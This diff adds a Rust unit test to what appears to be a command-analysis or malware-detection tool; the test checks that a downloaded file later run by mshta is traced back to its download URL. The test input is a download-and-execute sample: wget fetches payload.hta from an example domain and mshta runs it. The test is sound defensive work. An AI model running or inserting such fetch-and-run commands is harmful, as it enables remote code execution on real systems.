@@ -10539,6 +10539,28 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn wget_default_output_tracks_url_basename_for_later_execution() {
+        let report = crate::analyze(
+            br#"wget https://wget-default-output.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://wget-default-output.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "mshta local HTA did not resolve wget default-output download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn wget_glued_short_directory_prefix_tracks_url_basename_for_later_execution() {
         let report = crate::analyze(
             br#"wget -PC:\Temp https://wget-glued-prefix-mshta.example/payload.hta
